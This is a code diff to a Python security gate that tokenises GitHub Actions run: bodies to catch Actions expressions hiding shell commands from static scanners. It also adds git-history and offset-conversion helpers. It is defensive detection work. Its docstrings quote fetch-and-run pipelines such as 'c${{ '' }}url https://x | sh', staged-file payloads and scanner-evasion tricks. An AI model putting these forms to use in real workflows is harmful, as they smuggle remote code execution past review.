-    remainder = shell[match.end() :]
-    if FOREIGN_SHELL_REFERENCE_RE.search(remainder):
+    if not tokens or tokens[0] not in NON_BASH_INTERPRETERS:
         return False
-    return _remainder_is_inert_tokens_only(remainder)
+    interpreter = tokens[0]
+    return all(
+        _is_reviewed_shell_argument(token, interpreter) for token in tokens[1:]
+    )
 
 
 WINDOWS_BASH_FALLBACKS = (
@@ -2935,6 +2990,522 @@ def _body_is_valid_shell_syntax(run: str) -> bool:
     return result.returncode == 0
 
 
+def _shell_redirect_target_end(text: str, index: int) -> int:
+    """Return the offset past a redirect operator and the word it targets.
+
+    A here-string operand and a process substitution are excluded: their
+    contents reach the command rather than naming a file, so the caller keeps
+    tokenising them instead of skipping past.
+    """
+    length = len(text)
+    cursor = index
+    while cursor < length and text[cursor] in "<>&-":
+        cursor += 1
+    if text[index:cursor].startswith(("<<<", ">>>")):
+        return index + 3
+    while cursor < length and text[cursor] in " \t":
+        cursor += 1
+    if cursor < length and text[cursor] == "(":
+        # Process substitution runs its body; leave it for the tokeniser.
+        return cursor
+    while cursor < length and not text[cursor].isspace() and text[cursor] not in ";&|<>":
+        cursor += 1
+    return cursor
+
+
+def _shell_bracket_group_end(text: str, index: int) -> int:
+    """Return the offset past the bracket group opening at ``index``."""
+    opener = text[index]
+    closer = ")" if opener == "(" else "}"
+    depth = 0
+    cursor = index
+    length = len(text)
+    while cursor < length:
+        character = text[cursor]
+        if character == "\\":
+            cursor += 2
+            continue
+        if character == opener:
+            depth += 1
+        elif character == closer:
+            depth -= 1
+            if depth == 0:
+                return cursor + 1
+        cursor += 1
+    return length
+
+
+def _shell_quoted_span_end(text: str, index: int) -> int:
+    """Return the offset past the double-quoted span opening at ``index``."""
+    length = len(text)
+    cursor = index + 1
+    while cursor < length:
+        character = text[cursor]
+        if character == "\\" and cursor + 1 < length:
+            cursor += 2
+            continue
+        if character == '"':
+            return cursor + 1
+        cursor += 1
+    return length
+
+
+class _ShellScan(NamedTuple):
+    """Tokenised view of a ``run:`` body.
+
+    ``words`` pairs each word with whether it held the command slot of a simple
+    command and which pipeline it belongs to. ``writes`` records every file a
+    redirect writes, so a payload staged in one pipeline and executed from a
+    file in another stays one dataflow.
+    """
+
+    words: list[tuple[str, bool, int]]
+    writes: list[tuple[str, int]]
+
+
+def _shell_words(text: str) -> _ShellScan:
+    """Split ``text`` into words, honouring quotes, escapes, and substitutions.
+
+    Quoting, backslash escapes, line continuations, command substitution, and
+    bracket groups all glue text into one word, which is what a plain separator
+    scan misses. A pipe keeps the pipeline index because data flows along it; a
+    compound command opened inside a pipeline keeps it too, so
+    ``echo payload | while read l; do eval "$l"; done`` stays one dataflow; and
+    a group piped onwards folds back into the enclosing pipeline, so
+    ``{ echo payload; } | sh`` does as well. Every other separator starts a new
+    pipeline.
+    """
+    words: list[tuple[str, bool, int]] = []
+    writes: list[tuple[str, int]] = []
+    current: list[str] = []
+    index = 0
+    length = len(text)
+    expecting = True
+    word_expecting = True
+    pipeline = 0
+    next_pipeline = 1
+    piped: set[int] = set()
+    compounds: list[tuple[int, int]] = []
+
+    def separate() -> None:
+        """Start a new pipeline unless an enclosing piped compound owns this one."""
+        nonlocal pipeline, next_pipeline
+        if compounds and compounds[-1][0] in piped:
+            pipeline = compounds[-1][0]
+            return
+        pipeline = next_pipeline
+        next_pipeline += 1
+
+    def open_compound() -> None:
+        compounds.append((pipeline, len(words)))
+
+    def close_compound(at: int) -> None:
+        """Close the innermost compound, folding it into a pipe that follows it."""
+        nonlocal pipeline
+        if not compounds:
+            return
+        outer, start = compounds.pop()
+        if not _shell_pipe_follows(text, at):
+            return
+        # The group feeds a pipeline, so its contents share that dataflow.
+        for position in range(start, len(words)):
+            word, is_command, _ = words[position]
+            words[position] = (word, is_command, outer)
+        pipeline = outer
+
+    def flush() -> None:
+        nonlocal current, expecting, word_expecting
+        if not current:
+            return
+        word = "".join(current)
+        current = []
+        if word_expecting and SHELL_ASSIGNMENT_RE.match(word):
+            # An assignment prefix does not consume the command slot.
+            words.append((word, False, pipeline))
+            expecting = True
+            return
+        words.append((word, word_expecting, pipeline))
+        bare = word.strip("'\"")
+        if bare in SHELL_COMPOUND_OPENERS:
+            open_compound()
+        elif bare in SHELL_COMPOUND_CLOSERS:
+            close_compound(index)
+        if word_expecting:
+            expecting = bare in SHELL_RESERVED_WORDS
+
+    def start_word() -> None:
+        nonlocal word_expecting
+        if not current:
+            word_expecting = expecting
+
+    while index < length:
+        character = text[index]
+        if character == "\\" and index + 1 < length:
+            start_word()
+            current.append(text[index : index + 2])
+            index += 2
+            continue
+        if character == "'":
+            start_word()
+            end = text.find("'", index + 1)
+            end = length if end == -1 else end + 1
+            current.append(text[index:end])
+            index = end
+            continue
+        if character == '"':
+            start_word()
+            end = _shell_quoted_span_end(text, index)
+            current.append(text[index:end])
+            index = end
+            continue
+        if character == "`":
+            start_word()
+            end = text.find("`", index + 1)
+            end = length if end == -1 else end + 1
+            current.append(text[index:end])
+            index = end
+            continue
+        if character == "$" and index + 1 < length and text[index + 1] in "({":
+            start_word()
+            end = _shell_bracket_group_end(text, index + 1)
+            current.append(text[index:end])
+            index = end
+            continue
+        if character in "<>":
+            if current and "".join(current).isdigit():
+                # A leading file descriptor belongs to the redirect, not a command.
+                current = []
+            flush()
+            end = _shell_redirect_target_end(text, index)
+            # A process substitution runs inside the command it feeds, so it
+            # stays in the same pipeline rather than opening a new one.
+            if end < length and text[end] == "(":
+                piped.add(pipeline)
+            elif character == ">":
+                writes.append((text[index:end].lstrip("<>&- \t"), pipeline))
+            index = end
+            continue
+        if character == "|":
+            flush()
+            piped.add(pipeline)
+            expecting = True
+            # `|&` is one pipe operator. Letting the `&` fall through to the
+            # separator branch would split the two halves into unrelated
+            # pipelines and lose the dataflow between them.
+            index += 2 if index + 1 < length and text[index + 1] == "&" else 1
+            continue
+        if character in ";&\n" or character in "()" or (character in "{}" and not current):
+            flush()
+            if character in "({":
+                open_compound()
+                expecting = True
+                index += 1
+                continue
+            if character in ")}":
+                close_compound(index + 1)
+                expecting = True
+                index += 1
+                continue
+            expecting = True
+            separate()
+            index += 1
+            continue
+        if character.isspace():
+            flush()
+            index += 1
+            continue
+        start_word()
+        current.append(character)
+        index += 1
+    flush()
+    return _ShellScan(words, writes)
+
+
+def _shell_pipe_follows(text: str, index: int) -> bool:
+    """Report whether a single pipe is the next thing after ``index``."""
+    cursor = index
+    length = len(text)
+    while cursor < length and text[cursor] in " \t":
+        cursor += 1
+    return (
+        cursor < length
+        and text[cursor] == "|"
+        and (cursor + 1 >= length or text[cursor + 1] != "|")
+    )
+
+
+def _promote_shell_sink_arguments(scan: _ShellScan) -> list[tuple[str, bool, int]]:
+    """Treat every word in a pipeline that reaches a shell sink as a command word.
+
+    ``printf "c${{ '' }}url x | sh" | xargs -0 bash -c`` builds the command in an
+    argument and pipes it into a shell, so position alone stops separating data
+    from code. Scoping the promotion to the pipeline keeps an unrelated
+    ``curl ... | sh`` elsewhere in the body from promoting an expression that
+    only ever reaches an ``if`` condition.
+    """
+    sinks: set[int] = set()
+    aliases = _shell_sink_aliases(scan.words)
+    flags: dict[int, set[str]] = {}
+    for word, _, pipeline in scan.words:
+        matched = _shell_code_flags(word.strip("'\""))
+        if matched:
+            flags.setdefault(pipeline, set()).update(matched)
+    written: dict[str, set[int]] = {}
+    for target, pipeline in scan.writes:
+        written.setdefault(target.strip("'\""), set()).add(pipeline)
+    _record_writer_arguments(scan, written)
+    for word, is_command, pipeline in scan.words:
+        if not is_command:
+            continue
+        name = _shell_sink_name(word)
+        reference = _shell_variable_name(word)
+        if reference is not None:
+            # An unresolved name carrying a code flag is an interpreter call by
+            # construction: `SH=$(echo bash); $SH -c payload` runs the payload
+            # whatever the name holds.
+            name = aliases.get(reference, "" if reference in aliases else name)
+            if reference not in aliases and flags.get(pipeline):
+                sinks.add(pipeline)
+                continue
+        if name in SHELL_SINK_COMMANDS or (
+            flags.get(pipeline, set()) & SHELL_CODE_FLAG_SINKS.get(name, frozenset())
+        ):
+            sinks.add(pipeline)
+    _promote_staged_files(scan, sinks, written)
+    return [
+        (word, is_command or pipeline in sinks, pipeline)
+        for word, is_command, pipeline in scan.words
+    ]
+
+
+def _shell_code_flags(word: str) -> set[str]:
+    """Return the code flags a word matches, exactly or glued to its argument.
+
+    ``perl -e'system(<>)'`` glues the script to the flag, so an exact-token
+    comparison misses it while the interpreter still runs the argument.
+    """
+    if word in SHELL_CODE_FLAGS:
+        return {word}
+    # Any non-empty glued suffix counts as the flag's payload. Alphanumeric
+    # payloads are still code (perl -eprint runs print), so filtering them
+    # out reopened the glued path this function exists to close. The caller
+    # intersects the result with each command's own flag set, so a clustered
+    # option on a non-interpreter command never reaches a sink through this.
+    return {
+        flag
+        for flag in SHELL_CODE_FLAGS
+        if len(flag) == 2
+        and flag.startswith("-")
+        and word.startswith(flag)
+        and word[len(flag) :]
+    }
+
+
+def _record_writer_arguments(scan: _ShellScan, written: dict[str, set[int]]) -> None:
+    """Record the files a writer command names, alongside shell redirections.
+
+    ``echo payload | tee /tmp/f; sh /tmp/f`` stages the file through an
+    argument rather than a ``>``, so redirection parsing alone never sees it.
+    """
+    writing: set[int] = set()
+    for word, is_command, pipeline in scan.words:
+        if is_command and _shell_sink_name(word) in SHELL_FILE_WRITERS:
+            writing.add(pipeline)
+    for word, is_command, pipeline in scan.words:
+        if is_command or pipeline not in writing:
+            continue
+        target = word.strip("'\"")
+        if target.startswith("-"):
+            continue
+        written.setdefault(target, set()).add(pipeline)
+    _record_positional_arguments(scan, written)
+
+
+def _record_positional_arguments(scan: _ShellScan, written: dict[str, set[int]]) -> None:
+    """Record the positional parameters ``set --`` stages for a later sink.
+
+    ``set -- payload; bash -c "$1"`` moves the payload through the argument
+    list, which is a name a sink reads exactly the way it reads a file.
+    """
+    by_pipeline: dict[int, list[tuple[str, bool, int]]] = {}
+    for entry in scan.words:
+        by_pipeline.setdefault(entry[2], []).append(entry)
+    for target_pipeline in {
+        pipeline
+        for word, is_command, pipeline in scan.words
+        if is_command and _shell_sink_name(word) == "set"
+    }:
+        position = 0
+        for word, is_command, pipeline in by_pipeline.get(target_pipeline, ()):
+            if is_command:
+                continue
+            if word.strip("'\"") == "--":
+                position = 0
+                continue
+            position += 1
+            for name in (f"${position}", f"${{{position}}}", "$@", "$*"):
+                written.setdefault(name, set()).add(pipeline)
+
+
+def _promote_staged_files(
+    scan: _ShellScan, sinks: set[int], written: dict[str, set[int]]
+) -> None:
+    """Fold a pipeline that stages a file a sink later executes into that sink.
+
+    ``echo payload > /tmp/f & sh /tmp/f`` moves the payload through the
+    filesystem rather than a pipe, so pipeline scoping alone never connects the
+    two halves. ``chmod +x /tmp/f; /tmp/f`` runs the staged file directly
+    instead of handing it to a shell, so a command word naming a staged file
+    counts as the execution too.
+    """
+    for word, is_command, pipeline in scan.words:
+        staged = written.get(word.strip("'\""))
+        if staged is None:
+            continue
+        if pipeline in sinks and not is_command:
+            sinks.update(staged)
+        elif is_command:
+            sinks.add(pipeline)
+            sinks.update(staged)
+
+
+def _shell_sink_aliases(words: Sequence[tuple[str, bool, int]]) -> dict[str, str]:
+    """Return names assigned a literal sink command, keyed by the bare name.
+
+    ``SH=bash; $SH -c "c${{ '' }}url"`` reaches a shell through a variable, so
+    the sink lookup has to follow the assignment the same way taint does.
+    ``A=bash; B=$A; $B -c`` adds a hop, so an assignment whose value is itself
+    a variable is resolved through the chain before the sink test.
+    """
+    assigned: dict[str, str] = {}
+    for word, _, _ in words:
+        match = SHELL_ASSIGNMENT_RE.match(word)
+        if not match:
+            continue
+        name = word[: match.end()].split("[", 1)[0].rstrip("+=")
+        assigned[name] = _shell_sink_name(word[match.end() :])
+    resolved: dict[str, str] = {}
+    for name in assigned:
+        _resolve_shell_alias(name, assigned, resolved)
+    return {
+        name: value
+        for name, value in resolved.items()
+        if value in SHELL_SINK_COMMANDS or value in SHELL_CODE_FLAG_SINKS
+    }
+
+
+def _resolve_shell_alias(name: str, assigned: dict[str, str], resolved: dict[str, str]) -> str:
+    """Follow an assignment chain to the literal it ends on, memoising the walk.
+
+    Resolving each name independently is quadratic on a long chain, and a
+    self-referential pair (``A=$B; B=$A``) never terminates without the cycle
+    test, so the walk records the names it has visited and writes the answer
+    back to every one of them.
+    """
+    walked: list[str] = []
+    seen: set[str] = set()
+    current = name
+    while True:
+        if current in resolved:
+            value = resolved[current]
+            break
+        if current in seen:
+            value = ""
+            break
+        seen.add(current)
+        walked.append(current)
+        value = assigned.get(current, "")
+        reference = _shell_variable_name(value)
+        if reference is None:
+            break
+        current = reference
+    for entry in walked:
+        resolved[entry] = value
+    return value
+
+
+def _shell_variable_name(word: str) -> str | None:
+    """Return the variable a word expands, for ``$N``, ``${N}``, and quoted forms.
+
+    Returns ``None`` when the word is not a bare expansion, so a command word
+    that merely contains a variable is never mistaken for one.
+    """
+    match = SHELL_VARIABLE_WORD_RE.fullmatch(word.strip("'\""))
+    if match is None:
+        return None
+    return match.group(1) or match.group(2)
+
+
+def _shell_sink_name(word: str) -> str:
+    """Reduce a command word to the executable name a sink lookup compares."""
+    return word.strip("'\"").replace("\\\n", "").replace("\\", "").rsplit("/", 1)[-1]
+
+
+def _expression_tainted_variables(words: Sequence[tuple[str, bool, int]]) -> set[str]:
+    """Return names assigned a value that carries an expression.
+
+    ``CMD=c${{ '' }}url; $CMD https://x`` never puts the expression in command
+    position itself, so following the assignment is the only way to see that the
+    command word is attacker-shaped.
+    """
+    tainted: set[str] = set()
+    for word, _, _ in words:
+        match = SHELL_ASSIGNMENT_RE.match(word)
+        if match and EXPRESSION_SENTINEL in word[match.end() :]:
+            tainted.add(word[: match.end()].split("[", 1)[0].rstrip("+="))
+    return tainted
+
+
+def _splices_expression_into_command_word(run: str) -> bool:
+    """Report whether an Actions expression can shape a command word.
+
+    Actions substitutes ``${{ ... }}`` before Bash ever runs, so Semgrep and
+    every other static scanner read the pre-substitution text. Writing
+    ``c${{ '' }}url https://x | sh`` hides ``curl`` from the rules while Actions
+    reassembles the real command, and the resulting parse error was then
+    excused as an expression false positive.
+
+    An earlier form of this check scanned backwards for a separator character.
+    An adversarial review defeated it sixteen ways, because quoting, escapes,
+    line continuations, command substitution, redirects, brace groups, reserved
+    words such as ``then`` and ``do``, and ``eval`` or ``xargs`` all reach
+    command position without crossing one of those separators. Masking each
+    expression and tokenising the body the way a shell does covers all sixteen
+    while leaving every argument-position and string-position use alone.
+
+    A word that is nothing but the expression stays tolerated. That shape is
+    raw interpolation, which its own validation already covers, and it is not
+    the obfuscation this check exists to catch. Refs #3673.
+    """
+    masked = ACTIONS_EXPRESSION_RE.sub(EXPRESSION_SENTINEL, run)
+    if EXPRESSION_SENTINEL not in masked:
+        return False
+    words = _promote_shell_sink_arguments(_shell_words(masked))
+    if any(
+        EXPRESSION_SENTINEL in word and is_command and word.strip("'\"") != EXPRESSION_SENTINEL
+        for word, is_command, _ in words
+    ):
+        return True
+    tainted = _expression_tainted_variables(words)
+    if not tainted:
+        return False
+    return any(
+        is_command and _leading_variable_reference(word) in tainted
+        for word, is_command, _ in words
+    )
+
+
+def _leading_variable_reference(word: str) -> str | None:
+    """Return the variable a command word expands to, if it is only that.
+
+    A tainted name buried inside a larger word, such as the ``$COVERAGE`` in
+    ``$(echo "$COVERAGE >= 50" | bc -l)``, is an argument to some other command
+    rather than the command name itself.
+    """
+    match = SHELL_VARIABLE_REFERENCE_RE.match(word.strip("'\""))
+    return match.group(1) if match else None
+
+
 def _body_declares_its_own_interpreter(run: str) -> bool:
     """Report whether the body opens with a `#!` line.
 
@@ -2960,6 +3531,238 @@ def _body_declares_its_own_interpreter(run: str) -> bool:
     return bool(SHEBANG_RE.match(run))
 
 
+def _blob_id_at(repo_root: Path, commit: str, path: str) -> str | None:
+    result = _run_git(repo_root, ["rev-parse", f"{commit}:{path}"])
+    if result.returncode != 0:
+        return None
+    return result.stdout.strip() or None
+
+def _decoded_frontmatter(raw: bytes) -> str | None:
+    """Decode frontmatter strictly, or report that it cannot be reasoned about.
+
+    Frontmatter has to become text to be parsed as YAML. Decoding it lossily
+    would let two different field values collide on the replacement character
+    and drop out of the changed-key set, hiding an edit the exemption was never
+    meant to cover. Bytes YAML could not have meant are a reason to run the
+    validator, so this fails closed instead.
+    """
+    try:
+        return raw.decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+
+def _followed_blob_ids(repo_root: Path, path: str, diff_merges: str) -> set[str]:
+    """Blob ids from one `--follow` traversal of `path` on `origin/main`.
+
+    Reading ids out of the raw diff rather than re-reading the file at each
+    commit is what makes `--follow` useful here: at the older commits the
+    current name does not exist yet.
+
+    `diff_merges` is named rather than left to `-m`, which means
+    `--diff-merges=on` and takes its format from the user's `log.diffMerges`.
+    Set to `combined` or `dense-combined`, a merge prints one `::` record whose
+    fourth field is the first parent's pre-image, so the post-image this reads
+    would be the wrong blob. What this gate accepts is not a readability
+    preference.
+    """
+    result = _run_git_bytes(
+        repo_root,
+        [
+            "log",
+            f"--diff-merges={diff_merges}",
+            # `log.showSignature` prefixes each commit's raw records with the
+            # verification result, and the first field of the stream then
+            # begins with that text rather than the colon a record starts
+            # with. Every record is skipped and the walk reports that main
+            # carried nothing here, which refuses records main did carry, for
+            # whichever developers hold that setting. What this gate accepts
+            # is not a display preference.
+            "--no-show-signature",
+            "--follow",
+            "--format=",
+            "--raw",
+            "--no-abbrev",
+            # Paths arrive raw and NUL-separated. Left to the default, git
+            # quotes any path outside ASCII or carrying a quote, a backslash
+            # or a control character, and the scope test below ends on an
+            # anchor the closing quote defeats, so such an ADR would read as
+            # having no history. It also stops a tab inside a name from
+            # looking like the separator before a second path.
+            "-z",
+            "origin/main",
+            "--",
+            path,
+        ],
+    )
+    if result.returncode != 0:
+        return set()
+    # An unrecognised path carries no identity, so nothing below matches it and
+    # the caller is told main has carried nothing here. That refuses; it cannot
+    # exempt.
+    followed = _governed_document_identity(path)
+    blob_ids: set[str] = set()
+    # Decoded here rather than by the pipe. A text mode read applies universal
+    # newline translation, so a path ending in a carriage return arrives ending
+    # in a newline, and the scope test below anchors with `$`, which matches
+    # before a trailing newline. A path this gate does not govern then reads as
+    # one and its blobs join the carried set, which exempts content that never
+    # sat at a governed path. That is what this read fixes. The error handler
+    # is `surrogateescape` because it round trips and costs nothing, not
+    # because it changes a verdict: identity here is the record's number, so a
+    # byte spent elsewhere in the path reaches no decision either way, and a
+    # mutation to `replace` survives the suite for that reason.
+    fields = result.stdout.decode("utf-8", "surrogateescape").split("\0")
+    index = 0
+    while index < len(fields):
+        record = fields[index]
+        index += 1
+        if not record.startswith(":") or record.startswith("::"):
+            # A `::` record lists one pre-image per parent before the
+            # post-image, so its fourth field is a pre-image and its width
+            # depends on the parent count. Naming the format should keep these
+            # away; skipping them is what keeps that true if one arrives. The
+            # paths that follow one fail this same test and are skipped too.
+            continue
+        metadata = record.split()
+        if len(metadata) < 5:
+            continue
+        # A rename or a copy names a source and then a destination. Every
+        # other status names one path.
+        wanted = 2 if metadata[4][:1] in ("R", "C") else 1
+        paths = fields[index : index + wanted]
+        index += wanted
+        if len(paths) < wanted:
+            break
+        if _governed_document_identity(paths[-1]) != followed:
+            # `--follow` rewrites the path it tracks whenever it scores a drop
+            # and an add as a rename, which is similarity and not provenance.
+            # Crossing into a file this gate does not govern would read that
+            # file's states as states of this record, and they never faced ADR
+            # review; crossing into another record would read a decision
+            # somebody reviewed under a different number as this one. The
+            # post-image belongs to the record's destination path, so that is
+            # the path that has to qualify.
+            continue
+        blob_ids.add(metadata[3])
+    # A deletion names no blob afterwards, and the width of that field follows
+    # the repository's hash.
+    return {blob_id for blob_id in blob_ids if not _is_zero_sha(blob_id)}
+
+def _frontmatter_pair_for_a_body_unchanged_edit(
+    path: str,
+    repo_root: Path,
+) -> tuple[str, str] | None:
+    """Return HEAD and staged frontmatter for an edit that left the body alone.
+
+    `None` means no exemption is on offer: a blob is missing, either document
+    has no frontmatter, the bodies differ, or a frontmatter holds bytes UTF-8
+    cannot read. Both exemptions ask this same question and differ only in
+    which changed fields they will then accept.
+    """
+    old_blob = _read_head_blob(repo_root, path)
+    new_blob = _read_index_blob(repo_root, path)
+    if old_blob is None or new_blob is None:
+        return None
+    old_frontmatter, old_body = _split_frontmatter(old_blob)
+    new_frontmatter, new_body = _split_frontmatter(new_blob)
+    if not old_frontmatter or not new_frontmatter or old_body != new_body:
+        return None
+    old_text = _decoded_frontmatter(old_frontmatter)
+    new_text = _decoded_frontmatter(new_frontmatter)
+    if old_text is None or new_text is None:
+        return None
+    return old_text, new_text
+
+def _governed_document_identity(path: str) -> str | None:
+    """Which record `path` holds, or None if this gate does not govern it.
+
+    Scoping a followed history to governed paths does not tell two decision
+    records apart: both are governed. Records written from one template share
+    most of their lines, so git reads a commit that drops one and adds another
+    as a rename of it, and the walk crosses from one decision into the other.
+
+    The number in the filename is what says which decision a path holds. The
+    protocol has no number and stands for itself.
+    """
+    if ADR_PATH_RE.search(path):
+        # Read the number from the final segment, which is where the path test
+        # anchors. Across the whole path the first number wins, so a directory
+        # named for another record would shadow the one the file holds and two
+        # decisions would share one identity.
+        identifier = ADR_ID_RE.search(PATH_SEPARATOR_RE.split(path)[-1])
+        return _normalized_record_number(identifier.group(0)) if identifier else None
+    if SESSION_PROTOCOL_PATH_RE.search(path):
+        return "SESSION-PROTOCOL"
+    return None
+
+def _normalized_record_number(identifier: str) -> str:
+    """One record's number, written the one way, so a repad is not a new record.
+
+    This repo renamed `ADR-0003-...` to `ADR-003-...`. Compared as text those
+    are two identities, and the walk stops at the rename between them, which
+    refuses states the record plainly held.
+
+    Only the leading zeros go, and they go as text. Reading the number as an
+    integer instead would fold two records together twice over: `\\d` matches
+    every decimal digit, so a name written in another script is governed too
+    and would take the identity of the ASCII record holding the same value,
+    and a new file would inherit a real record's reviewed history. Stripping
+    zeros anywhere rather than in front would fold `ADR-100` into `ADR-1` the
+    same way. Text stripping leaves both pairs distinct.
+    """
+    prefix, _, number = identifier.upper().partition("-")
+    return f"{prefix}-{number.lstrip('0') or '0'}"
+
+def _is_scanned_suppression_rename(source: str, destination: str) -> bool:
+    return (
+        Path(source).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES
+        and Path(destination).suffix.lower() in SECURITY_SUPPRESSION_SUFFIXES
+    )
+
+def _parse_pure_scanned_rename_destinations(output: str) -> set[str] | None:
+    records = [record for record in output.split("\0") if record]
+    destinations: set[str] = set()
+    index = 0
+    while index < len(records):
+        status = records[index]
+        if index + 2 >= len(records):
+            print("ERROR: malformed rename status in pushed range", file=sys.stderr)
+            return None
+        source = _safe_relative_path(records[index + 1])
+        destination = _safe_relative_path(records[index + 2])
+        if source is None or destination is None:
+            print("ERROR: unsafe rename path in pushed range", file=sys.stderr)
+            return None
+        if status == "R100" and _is_scanned_suppression_rename(source, destination):
+            destinations.add(destination)
+        index += 3
+    return destinations
+
+def _pure_scanned_rename_destinations(
+    update: PushUpdate,
+    repo_root: Path,
+) -> set[str] | None:
+    result = _run_git(
+        repo_root,
+        [
+            "diff",
+            *TEXTUAL_DIFF_FLAGS,
+            "--find-renames=100%",
+            "--name-status",
+            "--diff-filter=R",
+            "-z",
+            update.range_spec,
+        ],
+    )
+    if result.returncode != 0:
+        _print_process_output(result)
+        return None
+    return _parse_pure_scanned_rename_destinations(result.stdout)
+
+PATH_SEPARATOR_RE = re.compile(r"[\\/]")
+
+
+
 def _step_defeats_bash_subparse(shell: str | None, run: str) -> bool:
     if _body_declares_its_own_interpreter(run):
         return False
@@ -2967,10 +3770,54 @@ def _step_defeats_bash_subparse(shell: str | None, run: str) -> bool:
         return True
     if not ACTIONS_EXPRESSION_RE.search(run):
         return False
+    if _splices_expression_into_command_word(run):
+        return False
     # An Actions expression explains a Bash sub-parse failure only when the body
     # is otherwise valid shell. Without this check, appending a deliberate syntax
     # error to a malicious script suppresses the finding and the error together.
     return _body_is_valid_shell_syntax(run)
+
+
+def _utf8_char_index_map(raw: bytes) -> dict[int, int] | None:
+    """Map every character-start byte offset in ``raw`` to its character index.
+
+    Built in one linear pass so a caller converting many offsets in the same
+    file does not re-decode a prefix per offset. Returns ``None`` when ``raw``
+    is not valid UTF-8 as a whole, which sends the caller back to the per-offset
+    path that can still resolve offsets inside a decodable prefix.
+    """
+    try:
+        text = raw.decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+    mapping: dict[int, int] = {}
+    byte_offset = 0
+    for char_index, character in enumerate(text):
+        mapping[byte_offset] = char_index
+        byte_offset += len(character.encode("utf-8"))
+    mapping[byte_offset] = len(text)
+    return mapping
+
+
+def _byte_offset_to_char_index(raw: bytes, offset: int) -> int | None:
+    """Convert a Semgrep byte offset into a PyYAML character index.
+
+    Semgrep reports ``start.offset`` and ``end.offset`` in bytes while PyYAML
+    exposes ``start_mark.index`` as a character index. The two diverge on any
+    file holding multibyte content, so the containment test read the wrong
+    region. An offset that lands mid-character returns ``None`` and the caller
+    drops the span, which blocks the push. Refs #3672.
+
+    Decoding a fresh prefix per call is quadratic in the file size. Callers
+    converting more than one offset from the same file should build the map once
+    with :func:`_utf8_char_index_map` instead. Refs #3673.
+    """
+    if offset < 0 or offset > len(raw):
+        return None
+    try:
+        return len(raw[:offset].decode("utf-8"))
+    except UnicodeDecodeError:
+        return None
 
 
 def _powershell_partial_parsing_spans(
@@ -2978,6 +3825,7 @@ def _powershell_partial_parsing_spans(
     message: str,
     target: Path,
     repo_root: Path,
+    raw: bytes,
 ) -> list[tuple[int, int, int, int]]:
     error_type = error.get("type")
     rule_ids = SEMGREP_PARTIAL_RULE_RE.findall(message)
@@ -2993,6 +3841,10 @@ def _powershell_partial_parsing_spans(
     locations = error_type[1]
     if not isinstance(locations, list):
         return []
+    # One pass over the file, not one decode per offset. Semgrep can report many
+    # locations for a single PartialParsing error, and each conversion used to
+    # re-decode the whole prefix. Refs #3673.
+    char_index_map = _utf8_char_index_map(raw)
     spans: list[tuple[int, int, int, int]] = []
     for location in locations:
         if not isinstance(location, dict):
@@ -3041,7 +3893,15 @@ def _powershell_partial_parsing_spans(
             or (end_line == start_line and end_col < start_col)
         ):
             return []
-        spans.append((start_line, end_line, start_offset, end_offset))
+        if char_index_map is None:
+            start_index = _byte_offset_to_char_index(raw, start_offset)
+            end_index = _byte_offset_to_char_index(raw, end_offset)
+        else:
+            start_index = char_index_map.get(start_offset)
+            end_index = char_index_map.get(end_offset)
+        if start_index is None or end_index is None:
+            return []
+        spans.append((start_line, end_line, start_index, end_index))
     return spans
 
 
